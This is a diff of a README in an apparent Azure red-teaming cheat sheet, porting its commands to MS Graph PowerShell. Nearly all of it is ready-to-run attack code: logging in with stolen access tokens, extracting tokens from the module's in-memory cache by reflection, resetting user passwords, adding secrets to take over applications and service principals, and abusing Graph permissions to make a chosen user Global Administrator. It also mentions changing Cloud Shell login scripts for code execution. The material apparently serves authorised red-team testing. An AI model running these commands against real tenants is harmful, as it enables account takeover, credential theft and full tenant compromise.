@@ -19,46 +19,62 @@ Collection of resources for Azure Red Teaming.
 
 - Powershell 7+
 - [Az PowerShell](https://learn.microsoft.com/en-us/powershell/azure/install-azps-windows?view=azps-11.2.0&tabs=powershell&pivots=windows-psgallery)
+- [MS Graph PowerShell](https://learn.microsoft.com/en-us/powershell/microsoftgraph/installation?view=graph-powershell-1.0)
 
 
 <a id='authn'></a>
 ##  Authentication
 
-### Interactive login
+### MS Graph PowerShell
+
+#### Interactive login
+```shell
+Connect-MgGraph
+```
+
+#### Device code authentication
+```shell
+Connect-MgGraph -UseDeviceAuthentication
+```
+
+#### Authenticate with a stolen access token
+
+```shell
+# audience: "https://graph.microsoft.com/"
+$msgraphToken  = '' 
+$secureToken = ConvertTo-SecureString -String $msgraphToken -AsPlainText -Force
+Connect-MgGraph -AccessToken $secureToken 
+```
+
+#### Retrieve the access token after successful authentication
+```shell
+$InMemoryTokenCacheGetTokenData = [Microsoft.Graph.PowerShell.Authentication.Core.TokenCache.InMemoryTokenCache].GetMethod("ReadTokenData",[System.Reflection.BindingFlags]::NonPublic+[System.Reflection.BindingFlags]::Instance)
+$TokenData = $InMemoryTokenCacheGetTokenData.Invoke([Microsoft.Graph.PowerShell.Authentication.GraphSession]::Instance.InMemoryTokenCache,$null)
+[System.Text.Encoding]::UTF8.GetString($TokenData)
+```
+
+### Az PowerShell
+
+#### Interactive login
 ```shell
 Connect-AzAccount
 ```
 
-### Device code authentication
+#### Device code authentication
 ```shell
 Connect-AzAccount -UseDeviceAuthentication
 ```
 
-### Authenticate with stolen access tokens
-
-**Note**: authenticating only with an MS Graph token is *not* possible (i.e. an ARM token is required)
+#### Authenticate with a stolen access token
 
 ```shell
 # audience: "https://management.core.windows.net/"
 $armToken = '' 
-# audience: "https://graph.microsoft.com/"
-$msgraphToken = '' 
-Connect-AzAccount -AccessToken $armToken -MicrosoftGraphAccessToken $msgraphToken -AccountId current
+Connect-AzAccount -AccessToken $armToken -AccountId current
 ```
 
 <a id='users'></a>
 ## User accounts
-
-###  Authenticate with a username and password
-```shell
-$tid = ''
-$username = ''
-$password = ''
-
-$securePassword = ConvertTo-SecureString -String $password -AsPlainText -Force
-$credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $username, $securePassword
-Connect-AzAccount -TenantId $tid -Credential $credential
-```
 
 ### Create a new user with a specific UPN
 
@@ -67,23 +83,32 @@ Connect-AzAccount -TenantId $tid -Credential $credential
 ```shell
 $upn = ''
 $password = ''
+$PasswordProfile = @{
+    Password = ''
+}
 $displayName = ''
 $emailUsername = ''
 
-$securePassword = ConvertTo-SecureString -AsPlainText -Force $password
-New-AzADUser -DisplayName $displayName -Password $securePassword -AccountEnabled $true -MailNickname $emailUsername -UserPrincipalName $upn
+New-MgUser -DisplayName $displayName -PasswordProfile $PasswordProfile -AccountEnabled $true -MailNickname $emailUsername -UserPrincipalName $upn
 ```
 
 ### Reset the password of a specific user
 
-**Note**: can be used to update any property of a user object ([more info](https://learn.microsoft.com/en-us/powershell/module/az.resources/update-azaduser)).
+**Note**: can be used to update any property of a user object ([more info](https://learn.microsoft.com/en-us/powershell/module/microsoft.graph.users/update-mguser?view=graph-powershell-1.0)).
 
 ```shell
 $upn = ''
-$password = ''
+$PasswordProfile = @{
+    Password = ''
+}
 
-$securePassword = ConvertTo-SecureString -AsPlainText –Force $password
-Update-AzADUser -UPNOrObjectId  $upn -Password $securePassword –Verbose
+Update-MgUser -UPNOrObjectId $upn -PasswordProfile $PasswordProfile –Verbose
+```
+
+### Identify the Object ID of a targeted user
+
+```shell
+Get-MgUser  -All -Search '"DisplayName:<cool app>"' -ConsistencyLevel eventual
 ```
 
 
@@ -95,20 +120,23 @@ Update-AzADUser -UPNOrObjectId  $upn -Password $securePassword –Verbose
 **Note**: SPs can only be added to security groups (i.e. not M365 groups)
 
 ```shell
-Get-AzADGroup -SearchString '<admin group>'
+Get-MgGroup -Search '<admin group>'
 ```
 ```shell
-Get-AzADUser -SearchString '<admin user>'
+Get-MgUser -Search '<admin user>'
 ```
 ```shell
-Get-AzADServicePrincipal -Searchstring '<compromised app>'
+Get-MgServicePrincipal -All -Search '"DisplayName:<compromised app>"' -ConsistencyLevel eventual
 ```
 
 ```shell
 $MemberOid  = ''
 $groupOid = ''
+$params = @{
+    "@odata.id" = "https://graph.microsoft.com/v1.0/directoryObjects/{$MemberOid}"
+}
 
-Add-AzADGroupMember -TargetGroupObjectId $groupOid -MemberObjectId $MemberOid
+New-MgGroupMemberByRef -GroupId $groupOid -BodyParameter $params
 ```
 
 
@@ -117,15 +145,18 @@ Add-AzADGroupMember -TargetGroupObjectId $groupOid -MemberObjectId $MemberOid
 
 ### Create a new secret for a targeted application object (takeover)
 ```shell
-$appid = ''
-New-AzADAppCredential -ApplicationId  $appid
+$appObjectid= ''
+
+Add-MgApplicationPassword -ApplicationId $appObjectid
 ```
 
 ### Assign an application permission to a targted application object
 
 **Description**: assigns the `RoleManagement.ReadWrite.Directory` permission to the targeted application object (still requires admin consent).
 
-**Note**: identifiers for other application permissions can be found [here](https://learn.microsoft.com/en-us/graph/permissions-reference).
+**Note**: 
+ - identifiers for other application permissions can be found [here](https://learn.microsoft.com/en-us/graph/permissions-reference)
+ - Uses Az PowerShell, as it does not seem possible with Mg PowerShell
 
 ```shell
 $targetedAppObjectId = '<OID of targeted App Reg>'
@@ -228,7 +259,7 @@ $password = ''
 
 $securePassword = ConvertTo-SecureString -String $password -AsPlainText -Force
 $credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $appid, $securePassword
-Connect-AzAccount -ServicePrincipal -TenantId $tid -Credential $credential
+Connect-MgGraph -TenantId $tid -ClientSecretCredential $credential
 ```
 
 ### Identify the Object ID of a targeted SP
@@ -236,13 +267,13 @@ Connect-AzAccount -ServicePrincipal -TenantId $tid -Credential $credential
 **Note**: the OID of an SP is different from the Object ID of its application registration.
 
 ```shell
-Get-AzADServicePrincipal -Searchstring '<cool app>'
+Get-MgServicePrincipal -All -Search '"DisplayName:<cool app>"' -ConsistencyLevel eventual
 ```
 
 ### Create a new secret for a targeted SP (takeover)
 ```shell
-$oid = ''
-New-AzADSpCredential -ObjectId $oid
+$spObjectId = ''
+Add-MgServicePrincipalPassword -ServicePrincipalId $spObjectId
 ```
 
 ### Abuse the `AppRoleAssignment.ReadWrite.All` permission
@@ -254,10 +285,10 @@ New-AzADSpCredential -ObjectId $oid
 ```shell
 $targetedSpObjectId = '<OID of targeted SP - Not App Reg>'
 
-$msgraphSpObjectId = (Get-AzADServicePrincipalAppRoleAssignment -ServicePrincipalId $targetedSpObjectId | Where-Object -Property ResourceDisplayName -EQ -Value "Microsoft Graph" | Select-Object -First 1).ResourceId
+$msgraphSpObjectId = (Get-MgServicePrincipalAppRoleAssignment -ServicePrincipalId $targetedSpObjectId | Where-Object -Property ResourceDisplayName -EQ -Value "Microsoft Graph" | Select-Object -First 1).ResourceId
 $roleManagementReadWriteDirectory = '9e3f62cf-ca93-4989-b6ce-bf83c28f9fe8'
 
-New-AzADServicePrincipalAppRoleAssignment -ServicePrincipalId $targetedSpObjectId -ResourceId $msgraphSpObjectId -AppRoleId $roleManagementReadWriteDirectory
+New-MgServicePrincipalAppRoleAssignment -ServicePrincipalId $targetedSpObjectId -ResourceId $msgraphSpObjectId -AppRoleId $roleManagementReadWriteDirectory
 ```
 
 ### Abuse the `RoleManagement.ReadWrite.Directory` permission
@@ -268,11 +299,10 @@ New-AzADServicePrincipalAppRoleAssignment -ServicePrincipalId $targetedSpObjectI
 
 ```shell
 $targetedUserObjectId = ''
-
 $globalAdminTemplateId = '62e90394-69f5-4237-9190-012177145e10'
-$payload = @{'@odata.type'='#microsoft.graph.unifiedRoleAssignment'; roleDefinitionId=$globalAdminTemplateId; principalId=$targetedUserObjectId; directoryScopeId='/'} | ConvertTo-Json
+$directoryScope = '/'
 
-Invoke-AzRestMethod https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments -Method POST -Payload $payload
+New-MgRoleManagementDirectoryRoleAssignment -DirectoryScopeId $directoryScope -PrincipalId $targetedUserObjectId -RoleDefinitionId $globalAdminTemplateId
 ```
 
 
@@ -314,7 +344,7 @@ echo $token
 **Description**: after downloading the `.img` file from a Cloud Shell Storage Account, mounts the file to a Linux system and modifies its login scripts for RCE.
 
 **Note**:
-- Login scripts for Linux and Windows are respectively:
+- Login-script locations for Linux and Windows are respectively:
   - `.bashrc`
   - `/home/<username>/.config/PowerShell/Microsoft.PowerShell_profile.ps1`
 - The curl command works on both platforms
